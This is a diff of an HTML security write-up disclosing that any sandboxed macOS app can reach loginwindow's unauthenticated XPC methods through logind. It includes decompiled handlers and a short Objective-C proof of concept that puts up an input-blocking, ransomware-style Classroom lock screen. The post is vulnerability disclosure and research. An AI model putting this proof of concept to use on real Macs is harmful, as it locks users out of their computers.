@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="icon" type="image/png" href="https://github.com/andrd3v.png">
-  <title>Mac App Store App to Ransomware via Apple Classroom — andrd3v</title>
+  <title>Mac App Store App to Ransomware via Apple Classroom | andrd3v</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
 
@@ -310,23 +310,23 @@
     <div class="tldr"><strong>TL;DR:</strong> A regular sandboxed app from the Mac App Store can lock your entire screen with a custom message, block all keyboard and mouse input, and you can't dismiss it. No special entitlements needed. Apple says it's not a security issue.</div>
 
     <img src="poc.png" alt="PoC locking the screen with a fake ransomware message" class="proof-img">
-    <p class="img-caption">PoC in action &mdash; screen fully locked with custom text, all input blocked</p>
+    <p class="img-caption">PoC in action: screen fully locked with custom text, all input blocked</p>
 
     <h2>Finding the target</h2>
 
-    <p>I was going through the list of XPC services reachable from within the macOS App Sandbox, looking for anything interesting. Most services do proper entitlement checks on incoming connections &mdash; you need a specific <code>com.apple.private.*</code> entitlement, which App Store apps can never get, so the door is shut.</p>
+    <p>I was going through the list of XPC services reachable from within the macOS App Sandbox, looking for anything interesting. Most services do proper entitlement checks on incoming connections. You need a specific <code>com.apple.private.*</code> entitlement, which App Store apps can never get, so the door is shut.</p>
 
     <p>Then I noticed <code>com.apple.logind</code>.</p>
 
-    <p><code>logind</code> is a small daemon that sits at <code>/System/Library/CoreServices/logind</code> and manages login sessions. It talks to <code>loginwindow</code> (the process that draws the login screen, handles logout, user switching, etc.) through an internal XPC endpoint. Nothing about it screams "attack surface" &mdash; it's boring infrastructure plumbing.</p>
+    <p><code>logind</code> is a small daemon that sits at <code>/System/Library/CoreServices/logind</code> and manages login sessions. It talks to <code>loginwindow</code> (the process that draws the login screen, handles logout, user switching, etc.) through an internal XPC endpoint. Nothing about it screams "attack surface." It's boring infrastructure plumbing.</p>
 
     <p>But when I opened the binary in IDA, the connection handler immediately caught my eye.</p>
 
     <h2>The two-tier gate</h2>
 
-    <p><code>logind</code>'s XPC listener is implemented through <code>login.framework</code> &mdash; a private framework at <code>/System/Library/PrivateFrameworks/login.framework</code>. The listener delegate is <code>LFlogindListenerDelegate</code>, and its <code>listener:shouldAcceptNewConnection:</code> method does this:</p>
+    <p><code>logind</code>'s XPC listener is implemented through <code>login.framework</code>, a private framework at <code>/System/Library/PrivateFrameworks/login.framework</code>. The listener delegate is <code>LFlogindListenerDelegate</code>, and its <code>listener:shouldAcceptNewConnection:</code> method does this:</p>
 
-<pre><code><span class="comment">// login.framework &mdash; LFlogindListenerDelegate</span>
+<pre><code><span class="comment">// login.framework: LFlogindListenerDelegate</span>
 
 <span class="type">__int64</span> -[LFlogindListenerDelegate listener:shouldAcceptNewConnection:](
         <span class="type">void</span> *self, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">id</span> connection)
@@ -363,8 +363,8 @@
     <p>Two things are happening here:</p>
 
     <ol>
-      <li>If you have <code>com.apple.private.logind.spi</code> &mdash; you get the full <code>LFLogindListenerInterface</code> with 40 privileged methods.</li>
-      <li>If you <strong>don't</strong> have it (i.e., you're a normal app) &mdash; you get <code>LFLogindListenerLookupInterface</code>, a smaller interface.</li>
+      <li>If you have <code>com.apple.private.logind.spi</code>, you get the full <code>LFLogindListenerInterface</code> with 40 privileged methods.</li>
+      <li>If you <strong>don't</strong> have it (i.e., you're a normal app), you get <code>LFLogindListenerLookupInterface</code>, a smaller interface.</li>
     </ol>
 
     <p>And <strong>either way, the connection is accepted</strong>. <code>return 1</code> at the bottom. No rejection. Every process on the system can connect to <code>logind</code>.</p>
@@ -375,7 +375,7 @@
 
     <p>Among the methods available without any entitlement is <code>SMGetSessionAgentConnection:</code>. Here's what it does:</p>
 
-<pre><code><span class="comment">// logind &mdash; SessionManagement</span>
+<pre><code><span class="comment">// logind: SessionManagement</span>
 
 <span class="type">void</span> -[SessionManagement <span class="func">SM_GetSessionAgentConnection:</span>](self, <span class="type">SEL</span>, reply)
 {
@@ -395,7 +395,7 @@
 
     <h2>What's a SessionAgent?</h2>
 
-    <p>When <code>loginwindow</code> starts, it registers itself with <code>logind</code> as the "SessionAgent" for the current login session. This is done through the <em>privileged</em> interface &mdash; <code>loginwindow</code> holds <code>com.apple.private.logind.spi</code>, so it gets access to <code>SMRegisterSessionAgent:reply:</code>.</p>
+    <p>When <code>loginwindow</code> starts, it registers itself with <code>logind</code> as the "SessionAgent" for the current login session. This is done through the <em>privileged</em> interface because <code>loginwindow</code> holds <code>com.apple.private.logind.spi</code>, giving it access to <code>SMRegisterSessionAgent:reply:</code>.</p>
 
     <p><code>loginwindow</code> passes its <code>NSXPCListenerEndpoint</code> to <code>logind</code>. <code>logind</code> stores it. Then when <em>anyone</em> calls <code>SMGetSessionAgentConnection:</code>, <code>logind</code> gives out that stored endpoint.</p>
 
@@ -405,7 +405,7 @@
 
     <p>So we have the endpoint. What happens when we connect to it?</p>
 
-<pre><code><span class="comment">// login.framework &mdash; LFSessionAgentListenerDelegate</span>
+<pre><code><span class="comment">// login.framework: LFSessionAgentListenerDelegate</span>
 
 <span class="type">__int64</span> -[LFSessionAgentListenerDelegate listener:shouldAcceptNewConnection:](
         <span class="type">void</span> *self, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">id</span> connection)
@@ -426,7 +426,7 @@
 
     <p>Zero authentication. No <code>SecTaskCopyValueForEntitlement</code>. No <code>audit_token</code> check. No PID check. Not even a log message. Just: set up the interface, resume, return 1.</p>
 
-    <p>This makes sense from the <em>original</em> design perspective &mdash; this listener was only meant to receive connections from <code>logind</code> through the stored endpoint, and <code>logind</code> is a trusted system daemon. Why would you authenticate a connection coming from yourself?</p>
+    <p>This makes sense from the <em>original</em> design perspective. This listener was only meant to receive connections from <code>logind</code> through the stored endpoint, and <code>logind</code> is a trusted system daemon. Why would you authenticate a connection coming from yourself?</p>
 
     <p>The problem is that <code>logind</code> hands out that endpoint to anyone who asks.</p>
 
@@ -434,36 +434,36 @@
 
     <h2>44 methods on loginwindow</h2>
 
-    <p>The interface exposed is <code>LFSessionAgentListenerInterface</code>, and <code>loginwindow</code> implements every method through <code>SessionAgentCom</code>. Here's the full list &mdash; <strong>44 methods, all callable from a sandboxed app</strong>:</p>
+    <p>The interface exposed is <code>LFSessionAgentListenerInterface</code>, and <code>loginwindow</code> implements every method through <code>SessionAgentCom</code>. Here's the full list: <strong>44 methods, all callable from a sandboxed app</strong>:</p>
 
-<div class="method-list"><span class="highlight">SACClassroomLockSetCaption:reply:</span>          <span class="dim">&mdash; set lock screen text</span>
-<span class="highlight">SACClassroomLockShow:</span>                      <span class="dim">&mdash; show fullscreen lock overlay</span>
-<span class="highlight">SACClassroomLockHide:</span>                      <span class="dim">&mdash; hide lock overlay</span>
-SACFaceTimeCallRingStart:                  <span class="dim">&mdash; trigger FaceTime ring</span>
-SACFaceTimeCallRingStop:                   <span class="dim">&mdash; stop FaceTime ring</span>
-SACAssertScreenLockViaTouchIDBlocked:      <span class="dim">&mdash; block Touch ID screen lock</span>
+<div class="method-list"><span class="highlight">SACClassroomLockSetCaption:reply:</span>          <span class="dim">// set lock screen text</span>
+<span class="highlight">SACClassroomLockShow:</span>                      <span class="dim">// show fullscreen lock overlay</span>
+<span class="highlight">SACClassroomLockHide:</span>                      <span class="dim">// hide lock overlay</span>
+SACFaceTimeCallRingStart:                  <span class="dim">// trigger FaceTime ring</span>
+SACFaceTimeCallRingStop:                   <span class="dim">// stop FaceTime ring</span>
+SACAssertScreenLockViaTouchIDBlocked:      <span class="dim">// block Touch ID screen lock</span>
 SACRemoveAssertScreenLockViaTouchIDBlocked:
 SACScreenLockViaTouchIDAssertionTimeout:
 SACScreenLockPreferencesChanged:
-<span class="highlight">SACLockScreenImmediate:</span>                    <span class="dim">&mdash; lock screen NOW</span>
+<span class="highlight">SACLockScreenImmediate:</span>                    <span class="dim">// lock screen NOW</span>
 SACLockScreenWhenBroughtOnConsole:
 SACScreenLockEnabled:
 SACShieldWindowShowing:
 SACScreenSaverIsRunning:
 SACScreenSaverCanRun:
 SACSetScreenSaverCanRun:reply:
-SACScreenSaverStartNow:                   <span class="dim">&mdash; start screensaver</span>
+SACScreenSaverStartNow:                   <span class="dim">// start screensaver</span>
 SACScreenSaverStartNowWithOptions:reply:
 SACScreenSaverStopNow:
 SACScreenSaverStopNowWithOptions:reply:
 SACScreenSaverTimeRemaining:
 SACScreenSaverIsRunningInBackground:
 SACScreenSaverDidFadeInBackground:psnHi:psnLow:reply:
-<span class="highlight">SACRestartForUser:reply:</span>                   <span class="dim">&mdash; RESTART the Mac</span>
-<span class="highlight">SACSetAutologinPassword:reply:</span>             <span class="dim">&mdash; set autologin password</span>
+<span class="highlight">SACRestartForUser:reply:</span>                   <span class="dim">// RESTART the Mac</span>
+<span class="highlight">SACSetAutologinPassword:reply:</span>             <span class="dim">// set autologin password</span>
 SACSetKeyboardType:productID:vendorID:countryCode:reply:
-<span class="highlight">SACSwitchToUser:reply:</span>                     <span class="dim">&mdash; switch user session</span>
-SACSwitchToLoginWindow:                    <span class="dim">&mdash; switch to login screen</span>
+<span class="highlight">SACSwitchToUser:reply:</span>                     <span class="dim">// switch user session</span>
+SACSwitchToLoginWindow:                    <span class="dim">// switch to login screen</span>
 SACBeginLoginTransition:reply:
 SACStartProgressIndicator:reply:
 SACStopProgressIndicator:
@@ -482,15 +482,15 @@ SACLOStartLogoutWithOptions:subType:showConfirmation:
 SACLORegisterLogoutStatusCallacks:reply:
 SACLOFinishDelayedLogout:reply:</div>
 
-    <p>Force logout. Force restart. User switching. Screen lock. Autologin password manipulation. And the one I found most amusing for a demo &mdash; <code>SACClassroomLock*</code>.</p>
+    <p>Force logout. Force restart. User switching. Screen lock. Autologin password manipulation. And the one I found most amusing for a demo: <code>SACClassroomLock*</code>.</p>
 
     <h2>The Classroom Lock</h2>
 
-    <p>Apple Classroom is an app for teachers to manage student devices. One of its features is "Lock Screen" &mdash; it puts a fullscreen overlay on the student's Mac showing a message, and blocks <strong>all</strong> keyboard and mouse input using a <code>CGEventTap</code>. The student can't dismiss it, can't Cmd+Tab, can't do anything. The teacher unlocks it when they're ready.</p>
+    <p>Apple Classroom is an app for teachers to manage student devices. One of its features is "Lock Screen," which puts a fullscreen overlay on the student's Mac showing a message and blocks <strong>all</strong> keyboard and mouse input using a <code>CGEventTap</code>. The student can't dismiss it, can't Cmd+Tab, can't do anything. The teacher unlocks it when they're ready.</p>
 
     <p>The implementation lives in <code>loginwindow</code>, behind the SAC methods. Here's <code>SACClassroomLockShow:</code>:</p>
 
-<pre><code><span class="comment">// loginwindow &mdash; SessionAgentCom</span>
+<pre><code><span class="comment">// loginwindow: SessionAgentCom</span>
 
 <span class="type">void</span> -[SessionAgentCom <span class="func">SACClassroomLockShow:</span>](self, <span class="type">SEL</span>, reply)
 {
@@ -522,18 +522,18 @@ SACLOFinishDelayedLogout:reply:</div>
 
     <p>The exploit is trivially simple. From a regular sandboxed macOS app:</p>
 
-<pre><code><span class="comment">// 1. Connect to logind &mdash; no entitlement needed</span>
+<pre><code><span class="comment">// 1. Connect to logind (no entitlement needed)</span>
 <span class="type">NSXPCConnection</span> *c = [[<span class="type">NSXPCConnection</span> alloc]
     initWithMachServiceName:<span class="string">@"com.apple.logind"</span> options:<span class="number">0</span>];
 c.remoteObjectInterface = [<span class="type">NSXPCInterface</span>
     interfaceWithProtocol:<span class="directive">@protocol</span>(<span class="type">LFLogindLookup</span>)];
 [c resume];
 
-<span class="comment">// 2. Ask for the SessionAgent endpoint &mdash; logind hands it over</span>
+<span class="comment">// 2. Ask for the SessionAgent endpoint (logind hands it over)</span>
 [[c remoteObjectProxy] SMGetSessionAgentConnection:
     ^(<span class="type">int</span> err, <span class="type">NSXPCListenerEndpoint</span> *endpoint) {
 
-    <span class="comment">// 3. Connect directly to loginwindow &mdash; zero auth</span>
+    <span class="comment">// 3. Connect directly to loginwindow (zero auth)</span>
     <span class="type">NSXPCConnection</span> *lw = [[<span class="type">NSXPCConnection</span> alloc]
         initWithListenerEndpoint:endpoint];
     lw.remoteObjectInterface = [<span class="type">NSXPCInterface</span>
@@ -547,7 +547,7 @@ c.remoteObjectInterface = [<span class="type">NSXPCInterface</span>
     [agent SACClassroomLockShow:^(<span class="type">int</span> e) {}];
 }];</code></pre>
 
-    <p>That's it. About 15 lines of Objective-C. A Mac App Store app &mdash; sandboxed, notarized, no special entitlements &mdash; locks the user's entire screen with custom text. The user cannot interact with the computer at all until the app decides to call <code>SACClassroomLockHide:</code>.</p>
+    <p>That's it. About 15 lines of Objective-C. A Mac App Store app (sandboxed, notarized, no special entitlements) locks the user's entire screen with custom text. The user cannot interact with the computer at all until the app decides to call <code>SACClassroomLockHide:</code>.</p>
 
     <p>And of course, since we have all 44 methods, the "ransomware" angle is just the flashiest demo. You could also force-restart the machine, force-logout the user, switch to a different user session, or mess with the autologin password.</p>
 
@@ -562,7 +562,7 @@ c.remoteObjectInterface = [<span class="type">NSXPCInterface</span>
     <p><em>macOS 26.5 beta (25F5053d). Tested April 2026.</em></p>
 
     <div class="update-block">
-      <span class="update-date">Update &mdash; May 1, 2026</span>
+      <span class="update-date">Update: May 1, 2026</span>
       <h2>Apple's final response</h2>
 
       <p>After the initial "we're unable to identify a security issue" reply, I followed up asking to clarify their position:</p>
@@ -573,7 +573,7 @@ c.remoteObjectInterface = [<span class="type">NSXPCInterface</span>
 
       <img src="update.png" alt="Apple's response: behavior falls outside the scope of the Apple Security Bounty program" class="proof-img">
 
-      <p>So Apple acknowledges the behavior is "disruptive" but classifies it as a "temporary, recoverable denial-of-service condition" &mdash; not a security boundary violation. No fix planned, no bounty. The 44 unauthenticated methods on <code>loginwindow</code> remain fully accessible to any sandboxed app.</p>
+      <p>So Apple acknowledges the behavior is "disruptive" but classifies it as a "temporary, recoverable denial-of-service condition," not a security boundary violation. No fix planned, no bounty. The 44 unauthenticated methods on <code>loginwindow</code> remain fully accessible to any sandboxed app.</p>
     </div>
 
     <div class="credits">
